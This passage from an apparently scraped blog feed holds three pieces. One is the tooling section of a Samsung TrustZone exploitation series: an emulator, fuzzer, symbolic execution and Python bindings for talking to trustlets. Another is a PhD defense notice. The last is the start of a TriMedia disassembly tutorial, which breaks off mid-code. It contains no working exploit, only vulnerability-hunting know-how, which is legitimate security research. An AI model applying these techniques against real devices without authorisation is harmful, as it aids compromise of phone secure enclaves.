href=\"https://github.com/unicorn-engine/unicorn\">Unicorn engine</a> (which uses QEMU) because we were already familiar with it and it provides Python bindings. It performs the same operations as the loader, but it also needs to handle the tlApi calls.</p> \n  <p>This handling is done by intercepting the control flow when it enters the mcLib. By reading the identifier that is put into the register <tt class=\"docutils literal\">R0</tt>, it deduces which of the tlApi was called. As a bare minimum, it needs to handle at least <em>tlApiExit</em>, which signals that the trustlet has finished executing, and can simply return 0 (success) for the others.</p> \n  <p>Here is a small demonstration of the emulator used on a trustlet:</p> \n  <asciinema-player src=\"resources/2019-12-10-samsung_trustzone_exploitation_part2/emulation.cast\" cols=\"175\" rows=\"24\" font-size=\"small\"></asciinema-player> \n  <p>The emulator is loaded with features that help during the exploitation phase. For example, it is possible to trace the instructions executed, print the values of the registers, dump the content of the stack, etc.</p> \n </div> \n <div class=\"section\" id=\"fuzzing-trusted-applications\"> \n  <h3>Fuzzing Trusted Applications</h3> \n  <p>The emulator proved itself very valuable because <a class=\"reference external\" href=\"https://github.com/quarkslab/samsung-trustzone-research/blob/master/fuzzer/fuzzer.py\">it can be plugged into a fuzzing engine</a>. This way, it now finds vulnerabilities automatically. No more manual analysis, which is a tedious and time-consuming process. Time is better spent exploiting these vulnerabilities or reverse engineering the other components (secure OS, monitor, etc.).</p> \n  <p>Not wanting to reinvent the wheel, we used AFL_Unicorn, an internal project developed at Quarkslab that bridges the AFL fuzzer with the Unicorn engine. But don't worry, we also ported it to <a class=\"reference external\" href=\"https://github.com/Battelle/afl-unicorn\">AFL-Unicorn</a>, the public project by <a class=\"reference external\" href=\"https://github.com/Battelle\">Battelle</a>.</p> \n  <p>A lot of the code is shared between the emulator and the fuzzing, the main differences being that:</p> \n  <ul class=\"simple\"> \n   <li>it starts the fork server when loading is complete;</li> \n   <li>it loads the input from disk and into the TCI buffer;</li> \n   <li>it forces a crash when an Unicorn exception is raised.</li> \n  </ul> \n  <p>Here is a small demonstration of the fuzzer finding a vulnerability:</p> \n  <asciinema-player src=\"resources/2019-12-10-samsung_trustzone_exploitation_part2/fuzzer.cast\" cols=\"175\" rows=\"24\" font-size=\"small\"></asciinema-player> \n  <p>The fuzzer is able to output coverage information in the <em>drcov</em> format, so that it is possible to check which parts of the code might have been reached. The IDA Pro plugin <a class=\"reference external\" href=\"https://github.com/gaasedelen/lighthouse\">Lighthouse</a> was the perfect companion for that task.</p> \n  <p>Here is a visualization of the coverage information of a simple run:</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2019-12-10-samsung_trustzone_exploitation_part2/coverage_info.png\" /> \n </div> \n <div class=\"section\" id=\"experimenting-with-symbolic-execution\"> \n  <h3>Experimenting with Symbolic Execution</h3> \n  <p>The fuzzer works fine, but we also wanted to try other techniques. So we developed a little experiment using <a class=\"reference external\" href=\"https://github.com/trailofbits/manticore\">Manticore</a> by <a class=\"reference external\" href=\"https://github.com/trailofbits\">Trail of Bits</a>, as the symbolic executor <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton\">Triton</a> developed by Quarkslab had no ARM support at the time.</p> \n  <p>Manticore has built-in support for loading ELF executables, so we had to convert the trustlet binaries first. Disregarding the specifics of the trustlets, we had to make a series of small patches (that have been upstreamed) to make it work.</p> \n  <p><a class=\"reference external\" href=\"https://github.com/quarkslab/samsung-trustzone-research/tree/master/tainting\">This script</a> roughly does the following things:</p> \n  <ul> \n   <li><p class=\"first\">during the setup phase, it maps the TCI buffer and adds a hook on the mcLib entry-point;</p> </li> \n   <li><p class=\"first\">when the hook is triggered, it checks which tlApi has been called:</p> \n    <blockquote> \n     <ul class=\"simple\"> \n      <li>for <em>tlApiWaitNotification</em>, it marks the TCI buffer as symbolic so it searches the whole input space;</li> \n      <li>for <em>tlApiNotify</em> or <em>tlApiExit</em>, the current state is terminated;</li> \n     </ul> \n    </blockquote> </li> \n   <li><p class=\"first\">on memory accesses, it asks the solver whether the address may be invalid.</p> </li> \n  </ul> \n  <p>Here is a small demonstration of the script finding an invalid memory access:</p> \n  <asciinema-player src=\"resources/2019-12-10-samsung_trustzone_exploitation_part2/tainting.cast\" cols=\"175\" rows=\"24\" font-size=\"small\"></asciinema-player> \n </div> \n <div class=\"section\" id=\"communicating-with-trusted-applications\"> \n  <h3>Communicating with Trusted Applications</h3> \n  <div class=\"section\" id=\"the-normal-world-software-stack\"> \n   <h4>The Normal World Software Stack</h4> \n   <p>As explained in the previous part, the Normal World can reach the Secure World using software interruptions and buffers of World-Shared Memory. In practice, this is implemented in the Normal World as a complex software stack.</p> \n   <p>To communicate with the Secure World, a process makes use of a native library <tt class=\"docutils literal\">libMcClient.so</tt> (that can also be used by applications via the <em>Java Native Interface</em>). This library communicates with the <em>Mobicore Daemon</em> (running in user-land) that can be found at <tt class=\"docutils literal\">/system/bin/mcDriverDaemon</tt> (or sometimes <tt class=\"docutils literal\">/vendor/bin/mcDriverDaemon</tt>). The daemon itself communicates with the <em>Mobicore Driver</em> (running in kernel-land) through a virtual device exposed at <tt class=\"docutils literal\"><span class=\"pre\">/dev/mobicore-user</span></tt>.</p> \n   <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2019-12-10-samsung_trustzone_exploitation_part2/software_stack.png\" /> \n   <p>The native library exports many functions that make up the McClient API. To interact programmatically with a trustlet, an application starts by opening a session to the virtual device using <tt class=\"docutils literal\">mcOpenDevice</tt> (and closes it after use using <tt class=\"docutils literal\">mcCloseDevice</tt>). It is now able to create sessions to trustlets or drivers.</p> \n   <p>A trustlet or driver can be loaded into the Secure World by allocating the WSM buffer and using either:</p> \n   <ul class=\"simple\"> \n    <li><tt class=\"docutils literal\">mcOpenTrustlet</tt> and specifying the trustlet binary as a parameter;</li> \n    <li><tt class=\"docutils literal\">mcOpenSession</tt> and specifying the trustlet UUID as a parameter.</li> \n   </ul> \n   <p>To send a command, the application puts the command identifier and arguments into the WSM buffer, and informs the trustlet that some data is available by calling <tt class=\"docutils literal\">mcNotify</tt>. It then waits for the trustlet to handle the command by calling <tt class=\"docutils literal\">mcWaitNotification</tt>. The response identifier and return values can be found inside the WSM buffer.</p> \n  </div> \n  <div class=\"section\" id=\"bindings-and-exploitation-framework\"> \n   <h4>Bindings and Exploitation Framework</h4> \n   <p>Our tools yielded a lot of (basic) vulnerabilities, so it was time to move on to exploiting them on a real device. It is possible to use the user space components provided by Trustonic themselves on their <a class=\"reference external\" href=\"https://github.com/Trustonic/trustonic-tee-user-space\">GitHub repo</a>, but that requires writing a lot of C code. Even using carefully crafted Makefiles, it gets old pretty fast so we made <a class=\"reference external\" href=\"https://github.com/quarkslab/samsung-trustzone-research/tree/master/bindings\">Python bindings</a>.</p> \n   <p>These bindings, called <tt class=\"docutils literal\">pymcclient</tt>, interface our exploits script with the <tt class=\"docutils literal\">libMcClient.so</tt> library. They make extensive use of the with-statement context for cleanly handling opening and closing of sessions, and allocation and freeing of buffers. We also enriched the IPython REPL to allow us to quickly develop exploits.</p> \n   <p>Here is what such a session might look like:</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"n\">In</span> <span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]:</span> <span class=\"c1\"># connecting to the virtual device</span>\n<span class=\"o\">...</span><span class=\"p\">:</span>    <span class=\"n\">device</span> <span class=\"o\">=</span> <span class=\"n\">McDevice</span><span class=\"p\">(</span><span class=\"n\">DEVICE_ID</span><span class=\"p\">)</span>\n        <span class=\"n\">device</span><span class=\"o\">.</span><span class=\"n\">open</span><span class=\"p\">()</span>\n<span class=\"n\">In</span> <span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">]:</span> <span class=\"c1\"># allocating the TCI buffer</span>\n<span class=\"o\">...</span><span class=\"p\">:</span>    <span class=\"n\">tci</span> <span class=\"o\">=</span> <span class=\"n\">device</span><span class=\"o\">.</span><span class=\"n\">malloc_wsm</span><span class=\"p\">(</span><span class=\"n\">TCI_BUFFER_SIZE</span><span class=\"p\">)</span>\n<span class=\"n\">In</span> <span class=\"p\">[</span><span class=\"mi\">3</span><span class=\"p\">]:</span> <span class=\"c1\"># loading the trustlet binary</span>\n<span class=\"o\">...</span><span class=\"p\">:</span>    <span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">TRUSTLET_FILE</span><span class=\"p\">,</span> <span class=\"s2\">\"rb\"</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"nb\">file</span><span class=\"p\">:</span>\n<span class=\"o\">...</span><span class=\"p\">:</span>        <span class=\"n\">bs</span> <span class=\"o\">=</span> <span class=\"nb\">file</span><span class=\"o\">.</span><span class=\"n\">read</span><span class=\"p\">()</span>\n<span class=\"n\">In</span> <span class=\"p\">[</span><span class=\"mi\">4</span><span class=\"p\">]:</span> <span class=\"c1\"># opening a session to the trustlet</span>\n<span class=\"o\">...</span><span class=\"p\">:</span>    <span class=\"n\">session</span> <span class=\"o\">=</span> <span class=\"n\">McTrustlet</span><span class=\"p\">(</span><span class=\"n\">device</span><span class=\"p\">,</span> <span class=\"n\">tci</span><span class=\"p\">,</span> <span class=\"n\">bs</span><span class=\"p\">)</span>\n<span class=\"o\">...</span><span class=\"p\">:</span>    <span class=\"n\">session</span><span class=\"o\">.</span><span class=\"n\">open</span><span class=\"p\">()</span>\n<span class=\"n\">In</span> <span class=\"p\">[</span><span class=\"mi\">5</span><span class=\"p\">]:</span> <span class=\"c1\"># writing a command</span>\n<span class=\"o\">...</span><span class=\"p\">:</span>    <span class=\"n\">tci</span><span class=\"o\">.</span><span class=\"n\">seek</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">)</span>\n<span class=\"o\">...</span><span class=\"p\">:</span>    <span class=\"n\">tci</span><span class=\"o\">.</span><span class=\"n\">write_dword</span><span class=\"p\">(</span><span class=\"mh\">0x1234</span><span class=\"p\">)</span>\n<span class=\"n\">In</span> <span class=\"p\">[</span><span class=\"mi\">6</span><span class=\"p\">]:</span> <span class=\"c1\"># sending the command</span>\n<span class=\"o\">...</span><span class=\"p\">:</span>    <span class=\"n\">session</span><span class=\"o\">.</span><span class=\"n\">notify</span><span class=\"p\">()</span>\n<span class=\"n\">In</span> <span class=\"p\">[</span><span class=\"mi\">7</span><span class=\"p\">]:</span> <span class=\"c1\"># waiting for a reply</span>\n<span class=\"o\">...</span><span class=\"p\">:</span>    <span class=\"n\">session</span><span class=\"o\">.</span><span class=\"n\">wait_notification</span><span class=\"p\">()</span>\n<span class=\"n\">In</span> <span class=\"p\">[</span><span class=\"mi\">8</span><span class=\"p\">]:</span> <span class=\"c1\"># closing everything</span>\n<span class=\"o\">...</span><span class=\"p\">:</span>    <span class=\"n\">session</span><span class=\"o\">.</span><span class=\"n\">close</span><span class=\"p\">()</span>\n<span class=\"o\">...</span><span class=\"p\">:</span>    <span class=\"n\">device</span><span class=\"o\">.</span><span class=\"n\">free_wsm</span><span class=\"p\">(</span><span class=\"n\">tci</span><span class=\"p\">)</span>\n<span class=\"o\">...</span><span class=\"p\">:</span>    <span class=\"n\">device</span><span class=\"o\">.</span><span class=\"n\">close</span><span class=\"p\">()</span>\n</pre> \n   </div> \n   <p>Here is what it looks like using contexts:</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"c1\"># connecting to the virtual device</span>\n<span class=\"k\">with</span> <span class=\"n\">McDevice</span><span class=\"p\">(</span><span class=\"n\">DEVICE_ID</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">device</span><span class=\"p\">:</span>\n    <span class=\"c1\"># allocating the TCI buffer</span>\n    <span class=\"k\">with</span> <span class=\"n\">device</span><span class=\"o\">.</span><span class=\"n\">buffer</span><span class=\"p\">(</span><span class=\"n\">TCI_BUFFER_SIZE</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">tci</span><span class=\"p\">:</span>\n        <span class=\"c1\"># opening a session to the trustlet</span>\n        <span class=\"n\">uuid</span> <span class=\"o\">=</span> <span class=\"nb\">bytes</span><span class=\"o\">.</span><span class=\"n\">fromhex</span><span class=\"p\">(</span><span class=\"n\">TRUSTLET_UUID</span><span class=\"p\">)</span>\n        <span class=\"k\">with</span> <span class=\"n\">McSession</span><span class=\"p\">(</span><span class=\"n\">device</span><span class=\"p\">,</span> <span class=\"n\">tci</span><span class=\"p\">,</span> <span class=\"n\">uuid</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">session</span><span class=\"p\">:</span>\n            <span class=\"c1\"># writing a command</span>\n            <span class=\"n\">tci</span><span class=\"o\">.</span><span class=\"n\">seek</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">)</span>\n            <span class=\"n\">tci</span><span class=\"o\">.</span><span class=\"n\">write_dword</span><span class=\"p\">(</span><span class=\"mh\">0x1234</span><span class=\"p\">)</span>\n            <span class=\"c1\"># sending the command</span>\n            <span class=\"n\">session</span><span class=\"o\">.</span><span class=\"n\">notify</span><span class=\"p\">()</span>\n            <span class=\"c1\"># waiting for a reply</span>\n            <span class=\"n\">session</span><span class=\"o\">.</span><span class=\"n\">wait_notification</span><span class=\"p\">()</span>\n            <span class=\"c1\"># reading the reply</span>\n            <span class=\"n\">tci</span><span class=\"o\">.</span><span class=\"n\">seek</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">)</span>\n            <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"nb\">hex</span><span class=\"p\">(</span><span class=\"n\">tci</span><span class=\"o\">.</span><span class=\"n\">read_dword</span><span class=\"p\">()))</span>\n</pre> \n   </div> \n  </div> \n </div> \n <div class=\"section\" id=\"reverse-engineering-the-trusted-os\"> \n  <h3>Reverse Engineering the Trusted OS</h3> \n  <p>Last but not least, reverse engineering the Trusted OS requires extracting its components from the SBOOT binary, and mapping them at the appropriate addresses. We have automated this process by developing <a class=\"reference external\" href=\"https://github.com/quarkslab/samsung-trustzone-research/blob/master/scripts/loaders/IDAPro/tbase_loader.py\">a loader for IDA Pro</a>, and later <a class=\"reference external\" href=\"https://github.com/quarkslab/samsung-trustzone-research/tree/master/scripts/loaders/Ghidra/tbaseloader\">one for Ghidra</a>.</p> \n </div> \n <div class=\"section\" id=\"conclusion\"> \n  <h3>Conclusion</h3> \n  <p>This research required a lot of tooling as, at the time we conducted it, almost no resources were publicly available. We also decided to develop new tools when we felt unsatisfied with whatever solution existed. That proved itself very valuable for our training sessions, during which we tried our best to guide our attendees through the same steps we followed. We hope that they might be useful to other people.</p> \n  <p>The next blog post in this series will detail the vulnerabilities we found and the exploits we developed to reach code execution in EL3. One of these vulnerabilities has yet to be patched and we are still waiting for the approval of the vendor to publish. In the meantime, feel free to contact us if you have any questions.</p> \n </div> \n</div>","descriptionType":"html","publishedDate":"Mon, 16 Dec 2019 23:00:00 +0000","feedId":11110,"bgimg":"http://blog.quarkslab.com/resources/2019-12-10-samsung_trustzone_exploitation_part2/script_before.png","linkMd5":"67866c8423e15119961fa91dec078a96","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn70@2020_4/2020/08/25/01-15-09-085_698244f85a1069e4.webp","destWidth":650,"destHeight":454,"sourceBytes":29223,"destBytes":45550,"author":"Alexandre Adamski","articleImgCdnMap":{"http://blog.quarkslab.com/resources/2019-12-10-samsung_trustzone_exploitation_part2/script_before.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn70@2020_4/2020/08/25/01-15-09-085_698244f85a1069e4.webp","http://blog.quarkslab.com/resources/2019-12-10-samsung_trustzone_exploitation_part2/script_after.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn40@2020_3/2020/08/25/01-15-15-164_249a44b43d381413.webp","http://blog.quarkslab.com/resources/2019-12-10-samsung_trustzone_exploitation_part2/coverage_info.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn28@2020_2/2020/08/25/01-15-13-299_f0fe9a53ae9fe577.webp","http://blog.quarkslab.com/resources/2019-12-10-samsung_trustzone_exploitation_part2/software_stack.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn20@2020_6/2020/08/25/01-15-13-074_4b1758cbb145e02e.webp"},"publishedOrCreatedDate":1598318092718},{"createdTime":"2020-08-25 09:14:52","updatedTime":"2020-08-25 09:14:52","title":"PhD Defense of Jonathan Salwan: Use of Symbolic Execution for Binary Deobfuscation","link":"http://blog.quarkslab.com/phd-defense-of-jonathan-salwan-use-of-symbolic-execution-for-binary-deobfuscation.html","description":"<p>We are pleased to announce that Jonathan Salwan will defend his PhD thesis entitled <em>Use of Symbolic Execution for Binary Deobfuscation</em>, which will take place on <strong>Thursday February 13, 2020 at 10:30</strong>, at <em>Université Grenoble Alpes, Bâtiment IMAG</em>.</p> \n<p>The jury will be composed of:</p> \n<div class=\"line-block\"> \n <div class=\"line\">\n   Pr. Vincent Nicomette, Rapporteur \n </div> \n <div class=\"line\">\n   Pr. Jean-Yves Marion, Rapporteur \n </div> \n <div class=\"line\">\n   Pr. Philippe Elbaz-Vincent, President of jury \n </div> \n <div class=\"line\">\n   Dr. Sarah Zennou, Examiner \n </div> \n <div class=\"line\">\n   Dr. Robin David, Examiner \n </div> \n <div class=\"line\">\n   Pr. Marie-Laure Potet, PhD advisor \n </div> \n <div class=\"line\">\n   Dr. Sébastien Bardin, Co-advisor \n </div> \n <div class=\"line\">\n   Cédric Tessier, Guest \n </div> \n <div class=\"line\"> \n  <br /> \n </div> \n</div> \n<p><em>Abstract :</em></p> \n<p>This doctoral work has been done in an industrial environment where the main activities were reverse engineering for vulnerability research and security properties verification on binary programs. The first part of this doctoral work focuses on the collection and sharing of the industrial problems when analyzing binary programs. Based on these issues, a binary dynamic analysis framework has been developed and formalized. Real examples of use are then presented, such as the detection of opaque predicates in branch conditions. Finally, a new automatic approach for deobfuscation of binary code protected by virtualization is presented combining features of the framework as well as those of other tools.</p> \n<p><em>Résumé :</em></p> \n<p>Cette thèse a été faite dans un cadre industriel où les activités principales sont la rétro-ingénierie pour la recherche de vulnérabilités et la vérification de certaines propriétés de sécurité sur des programmes déjà compilés. La première partie de cette thèse porte sur la collecte et le partage des problématiques industrielles lors de l'analyse de programmes binaires. Basé sur ces problématiques, un cadre de travail d'analyse dynamique binaire a été développé et formalisé. Des exemples réels d'utilisation y sont ensuite présentés tels que la détection de prédicats opaques dans les conditions de branchement. Enfin, une nouvelle approche automatique permettant la dévirtualisation de code binaire y est présentée en combinant les fonctionnalités du cadre de travail ainsi que celles d'autres outils.</p> \n<p>Links to the <a class=\"reference external\" href=\"http://blog.quarkslab.com/resources/2020-02-13-salwan-soutenance/salwan-thesis.pdf\">PhD thesis</a> and <a class=\"reference external\" href=\"http://blog.quarkslab.com/resources/2020-02-13-salwan-soutenance/salwan-slide-thesis.pdf\">slides</a></p>","descriptionType":"html","publishedDate":"Wed, 12 Feb 2020 23:00:00 +0000","feedId":11110,"bgimg":"","linkMd5":"a516c61266a2b4331ee54854a22635ff","bgimgJsdelivr":"","metaImg":"","author":"Quarkslab","publishedOrCreatedDate":1598318092716},{"createdTime":"2020-08-25 09:14:52","updatedTime":"2020-08-25 09:14:52","title":"Reverse Engineering a Philips TriMedia CPU based IP Camera - Part 3","link":"http://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-3.html","description":"<div class=\"section\" id=\"introduction\"> \n <h2>Introduction</h2> \n <p>Welcome to the final chapter of the Trimedia series.</p> \n <p>In the <a class=\"reference external\" href=\"https://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-1.html\">first part of the series</a>, I introduced this research project, showing the different steps I took in order to analyze the firmware and the hardware of the camera. Then, in the <a class=\"reference external\" href=\"https://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-2.html\">second part</a>, I presented the Philips TriMedia architecture, its instruction set and assembly. This time, I'll show you, through a practical example, how a Philips TriMedia instruction can be disassembled.</p> \n <p>Don't be scared, I'm sure that understanding all the points and the process of disassembling an instruction will eventually require more than one read, but if you are really interested in the subject I'm sure you'll manage to get all the concepts.</p> \n <p>In my case, understanding everything took me many hours of reading the docs, looking at the disassembler code and do my own experiments, and even more hours of work to try to explain all this mess in the blog post series. Thus it may require some effort from the reader in order to get the basic idea of how all the disassembling process works.</p> \n <p>It's a very long read so I advise you to get your favorite drink and eat something while reading.</p> \n</div> \n<div class=\"section\" id=\"going-to-the-darkness\"> \n <h2>Going to the darkness</h2> \n <p>Now, it's time to explain how all this works in real life with a real life example :)</p> \n <p>Let us take a small binary named 'tinytest.o' that comes with the <a class=\"reference external\" href=\"https://sourceforge.net/projects/tm32dis/\">tm32disassembler</a> in the <tt class=\"docutils literal\">test</tt> folder in order to explain how we can disassemble a TriMedia (TM for short) instruction. At the beginning, it can be a little bit tricky but after playing around for some time, it starts to make sense. I've chosen this binary because it is really small (6 instructions) and it is a good explanation support.</p> \n <p>The following are the hexadecimal bytes of the binary:</p> \n <pre class=\"literal-block\">\n7C 47 81 43 60 21 60 A0 85 50 80 30 03 C1 08 00 40 E0 60 45 60 11 40 0F 80 00 57 01 D5 43 21 51 88 08 83 68 C1 D7 21 21 83 68 01 81 28 06 04 22 C1 95 C1 FC A7 A2 11 A2 22 01 22 07 00 A0 95 95 FE FF 02 07 E0 A1 FC 43 07 00 A2 7E 01 AA 82 08 11 02\n</pre> \n <p>One thing I mentioned during my talks at <a class=\"reference external\" href=\"https://www.youtube.com/watch?v=Ds1KtUBloEA\">Ekoparty 2018</a> and <a class=\"reference external\" href=\"https://troopers.de/troopers19/agenda/83cfsn/\">Troopers 2019</a> is that the process of disassembling a TM instruction involves different steps that can be summarized as follows:</p> \n <ol class=\"arabic simple\"> \n  <li>get the instruction length;</li> \n  <li>get the operation size (compressed size);</li> \n  <li>unpack the operation;</li> \n  <li>decode the operation.</li> \n </ol> \n <p>How do we start disassembling these bytes? As I mentioned in the previous posts, the execution flow is divided into <strong>Decision Trees</strong> (dtree) and that's the first thing a TriMedia CPU does when processing an instruction, it creates a dtree. A dtree is always encoded with the 0xAA02 word and these bytes are used as the first format bit field in order to disassemble an instruction.</p> \n <p>Before starting, I want to refresh some basic concepts that I will use during this post. Please, keep them in mind because I'm going to use them constantly, especially the format bits.</p> \n <p>These are the basic concepts you have to keep in mind when reading the post:</p> \n <ol class=\"arabic simple\"> \n  <li><strong>ONE INSTRUCTION</strong> is composed of up to <strong>FIVE OPERATIONS</strong>;</li> \n  <li>an <strong>instruction</strong> has a <strong>minimum</strong> of <strong>three operations</strong>;</li> \n  <li>the NOP operation has no length;</li> \n  <li>there is, at least, <strong>ONE</strong> group of format bits at the beginning of an instruction;</li> \n  <li>format bits are used to describe properties of the operations inside an instruction;</li> \n  <li>format bits are, at most, 10 bits. Five groups of two bits each. Three groups are the minimum that can be found in an instruction. Five is the maximum;</li> \n  <li>there are extension bits that can be used to extend an instruction from three operations up to five operations;</li> \n  <li>a function in the TriMedia ASM starts with a dtree.</li> \n </ol> \n <p>The following diagram demonstrates, in a general manner, how a TriMedia instruction is composed:</p> \n <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-01-16_reversing-trimedia-part-3/tminstruction.png\" style=\"width: 600px;\" /> \n <div class=\"section\" id=\"step-1-get-the-length-of-the-instruction\"> \n  <h3>Step 1 - Get the length of the instruction</h3> \n  <p>The first step is the easiest one. We want to know how long is our instruction and, in order to do that we have to know how many operations are inside it. But not only how many operations but also how many format bits and extension bytes. All this information is provided by the format bits themselves.</p> \n  <p><a class=\"reference external\" href=\"https://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-2.html\">In the second part of the series</a> we saw there is a table that gives us information about all the possible combinations format bits may have:</p> \n  <table border=\"1\" class=\"docutils\"> \n   <colgroup> \n    <col width=\"20%\" /> \n    <col width=\"22%\" /> \n    <col width=\"58%\" /> \n   </colgroup> \n   <thead valign=\"bottom\"> \n    <tr> \n     <th class=\"head\">Format (2i) (lsb)</th> \n     <th class=\"head\">Format (2i+1) (msb)</th> \n     <th class=\"head\">Meaning</th> \n    </tr> \n   </thead> \n   <tbody valign=\"top\"> \n    <tr> \n     <td>0</td> \n     <td>0</td> \n     <td>Issue slot <tt class=\"docutils literal\">i</tt> is used and an operation for it is available in the instruction. The operation size is 26 bits. The size of the extension is 0 bytes.</td> \n    </tr> \n    <tr> \n     <td>1</td> \n     <td>0</td> \n     <td>Issue slot <tt class=\"docutils literal\">i</tt> is used and an operation for it is available in the instruction. The operation size is 34 bits. The size of the extension is 1 byte.</td> \n    </tr> \n    <tr> \n     <td>0</td> \n     <td>1</td> \n     <td>Issue slot <tt class=\"docutils literal\">i</tt> is used and an operation for it is available in the instruction. The operation size is 42 bits. The size of the extension is 2 bytes.</td> \n    </tr> \n    <tr> \n     <td>1</td> \n     <td>1</td> \n     <td>Issue slot is unused and no operation for it is included in the instruction.</td> \n    </tr> \n   </tbody> \n  </table> \n  <p>By reading this table, we get exactly the amount of bits required for each operation and the extension bytes. We already know that the format bits are located at the beginning of the instruction thus we have to get them and process them.</p> \n  <p>As I already mentioned, the execution flow in the TriMedia ASM is indicated by a dtree and the bytes representing the dtree are used also as the only uncompressed instruction (branch):</p> \n  <pre class=\"literal-block\">\nFormat bytes: 0x02AA -&gt; binary form: 0000 0010 1010 1010\nIssue slot no: 0\n</pre> \n  <p>Every time you start disassembling a TriMedia stream, you have to remember the dtree bytes because you must start by processing them. They are implicitly taken as the first group of format bits for the first instruction. Then, the format bits at the beginning of the first instruction are used as format bits for the next instruction. Let's try to explain it better with a picture:</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-01-16_reversing-trimedia-part-3/format_bits.png\" style=\"width: 600px;\" /> \n  <p>At this point, we already have 16 bits due to the first format field, but not all the bits are used, just 10 bits. Let's keep that in mind for the final calculation.</p> \n  <p>The astute reader will surely have noticed that, as the dtree always starts with 0x02AA, then the first instruction is always 224 bits long. Why? because the format bits are <tt class=\"docutils literal\">{01, 01, 01, 01, 01}</tt>, let's show them again:</p> \n  <pre class=\"literal-block\">\nFormat bytes: 0x02AA -&gt; binary form: 00 00 00 10 10 10 10 10 (read it from right to left, we are working with little endianess, we have to swap the bytes)\n                                              ^^ ^^ ^^ ^^ ^^\n</pre> \n  <p>If we pay attention to the previous table, we can infer that the combination of <tt class=\"docutils literal\">0</tt> (lsb) and <tt class=\"docutils literal\">1</tt> (msb) means:</p> \n  <pre class=\"literal-block\">\nIssue slot i is used and an operation for it is available in the instruction.\nThe operation size is 42 bits.\nThe size of the extension is 2 bytes.\n</pre> \n  <p>At the moment, we know that the instruction contains 5 operations with 42 bits each.</p> \n  <p>One remark: the specs says that if the instruction contains more than three operations, we have to add 8 bits for the format field of the second group of operations (2 operations). By doing some calculation, we infer that the 224 bits are formed by the first 16 bits, 5 operations with 40 bits each (the 2 bits left in each operation, which are the formats bits, are included in the first 16 bits) and the final 8 bits for the second format field as a consequence of the additional 2 operations.</p> \n  <p>To get a clearer idea of what I'm talking about, <a class=\"reference external\" href=\"https://github.com/poxyran/tm32disassembler/blob/master/tm32funcs.c#L78\">look at the following code</a> extracted from the disassembler:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"kt\">uint16_t</span> <span class=\"nf\">instructionlength</span><span class=\"p\">(</span><span class=\"kt\">uint16_t</span> <span class=\"n\">formatbits</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"kt\">uint32_t</span> <span class=\"n\">i</span><span class=\"p\">;</span>\n        <span class=\"kt\">uint16_t</span> <span class=\"n\">len</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">instrcount</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n\n        <span class=\"n\">len</span> <span class=\"o\">=</span> <span class=\"mi\">16</span><span class=\"p\">;</span>           <span class=\"c1\">// add the two bytes for the 1st format field</span>\n        <span class=\"k\">for</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">&lt;</span><span class=\"mi\">5</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span>\n        <span class=\"k\">switch</span><span class=\"p\">(</span><span class=\"n\">formatbits</span> <span class=\"o\">&gt;&gt;</span> <span class=\"p\">(</span><span class=\"mi\">2</span> <span class=\"o\">*</span> <span class=\"n\">i</span><span class=\"p\">)</span> <span class=\"o\">&amp;</span> <span class=\"mi\">3</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n                <span class=\"k\">case</span> <span class=\"mi\">0</span>  <span class=\"o\">:</span>   <span class=\"n\">len</span> <span class=\"o\">+=</span> <span class=\"mi\">24</span><span class=\"p\">;</span>  <span class=\"c1\">// 26-bit operation</span>\n                                        <span class=\"n\">instrcount</span><span class=\"o\">++</span><span class=\"p\">;</span>\n                                        <span class=\"k\">break</span><span class=\"p\">;</span>\n                <span class=\"k\">case</span> <span class=\"mi\">1</span>  <span class=\"o\">:</span>   <span class=\"n\">len</span> <span class=\"o\">+=</span> <span class=\"mi\">32</span><span class=\"p\">;</span>  <span class=\"c1\">// 34-bit</span>\n                                        <span class=\"n\">instrcount</span><span class=\"o\">++</span><span class=\"p\">;</span>\n                                        <span class=\"k\">break</span><span class=\"p\">;</span>\n                <span class=\"k\">case</span> <span class=\"mi\">2</span>  <span class=\"o\">:</span>   <span class=\"n\">len</span> <span class=\"o\">+=</span> <span class=\"mi\">40</span><span class=\"p\">;</span>  <span class=\"c1\">// 42-bit operation</span>\n                                        <span class=\"n\">instrcount</span><span class=\"o\">++</span><span class=\"p\">;</span>\n                                        <span 